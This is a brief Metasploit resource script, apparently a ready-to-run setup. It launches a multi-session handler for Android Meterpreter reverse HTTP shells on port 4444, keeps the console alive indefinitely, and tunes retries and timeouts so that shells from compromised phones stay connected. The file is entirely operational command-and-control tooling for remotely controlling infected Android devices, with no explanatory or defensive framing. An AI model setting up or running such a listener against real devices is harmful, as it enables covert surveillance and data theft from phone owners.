# Multi-session HTTP handler — keeps console ALIVE after job start
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_http
set LHOST 127.0.0.1
set LPORT 4444
set ExitOnSession false
set SessionRetryTotal 0
set StagerRetryCount 10
set AutoVerifySessionTimeout 120
set SessionCommunicationTimeout 3600
set HttpConnectionRetryTotal 10
exploit -j
sleep 100000000